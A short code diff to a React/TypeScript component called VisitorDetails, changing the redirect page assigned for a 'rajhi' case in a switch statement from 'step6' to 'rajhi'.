@@ -56,7 +56,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
           }
           break
           case "rajhi":
-            updates = { redirectPage: "step6" as any }
+            updates = { redirectPage: "rajhi" as any }
             break
         case "insur":
           updates = { redirectPage: "insur" as any }
